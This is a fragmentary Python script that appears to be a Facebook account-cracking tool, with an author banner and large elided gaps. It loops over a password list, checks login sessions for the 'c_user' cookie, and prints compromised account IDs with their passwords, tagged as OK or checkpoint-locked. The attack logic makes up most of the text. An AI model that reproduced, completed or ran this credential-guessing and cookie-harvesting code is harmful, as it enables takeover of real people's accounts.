...
'''
this is an open source program by Mr. Error (ARIYAN-Vau)
...
----------------------------------------------
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %s𝙈𝙧. AriyA'n SiN'gg                    %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : f-c-d-b  %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [ARIYAN-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [ARIYAN-CP] '+uidx+' | '+pasw+'\033[0;97m')
